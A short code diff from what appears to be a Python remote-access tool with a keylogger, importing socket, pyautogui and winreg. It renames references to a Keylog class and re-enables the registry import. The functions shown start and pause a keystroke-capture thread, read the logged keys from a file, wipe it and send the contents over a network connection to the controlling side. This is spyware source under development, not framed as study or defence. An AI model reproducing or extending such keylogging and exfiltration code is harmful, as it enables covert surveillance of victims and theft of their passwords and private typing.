@@ -1,6 +1,6 @@
 import socket
 import threading
-#import winreg
+import winreg
 import pyautogui
 import io
 import time
@@ -275,23 +275,23 @@ class Server:
 
     def hookKey(self):
         self.tklog.resume()
-        open(AppStart.path, "w").close()
+        open(Keylog.path, "w").close()
 
     def unhook(self):
         self.tklog.suspend()
 
     def printkeys(self):
         s = ""
-        with open(AppStart.path, "r") as file:
+        with open(Keylog.path, "r") as file:
             s = file.read()
-        open(AppStart.path, "w").close()
+        open(Keylog.path, "w").close()
         if not s:
             s = "\0"
         self.nw.write(s)
         self.nw.flush()
 
     def keylog(self):
-        self.tklog = threading.Thread(target=KeyLogger.startKLog)
+        self.tklog = threading.Thread(target=Keylog.startKLog)
         s = ""
         self.tklog.start()
         self.tklog.suspend()
